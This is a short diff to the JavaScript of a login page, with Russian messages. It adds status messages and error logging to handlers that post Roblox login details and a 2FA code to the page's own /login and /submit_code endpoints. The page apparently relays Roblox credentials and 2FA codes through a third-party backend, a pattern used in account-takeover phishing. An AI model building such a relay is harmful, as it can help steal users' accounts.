@@ -53,6 +53,8 @@ document.addEventListener('DOMContentLoaded', function() {
         submitButton.disabled = true;
         
         try {
+            showMessage('Подключаюсь к Roblox...', 'info');
+            
             const response = await fetch('/login', {
                 method: 'POST',
                 headers: {
@@ -78,6 +80,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         } catch (error) {
             showMessage(`❌ Ошибка: ${error.message}`, 'error');
+            console.error('Ошибка входа:', error);
         } finally {
             // Восстанавливаем кнопку
             submitButton.querySelector('.button-text').textContent = originalText;
@@ -109,6 +112,8 @@ document.addEventListener('DOMContentLoaded', function() {
         submitButton.disabled = true;
         
         try {
+            showMessage('Проверяю код 2FA...', 'info');
+            
             const response = await fetch('/submit_code', {
                 method: 'POST',
                 headers: {
@@ -133,6 +138,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         } catch (error) {
             showMessage(`❌ Ошибка: ${error.message}`, 'error');
+            console.error('Ошибка 2FA:', error);
         } finally {
             // Восстанавливаем кнопку
             submitButton.textContent = originalText;
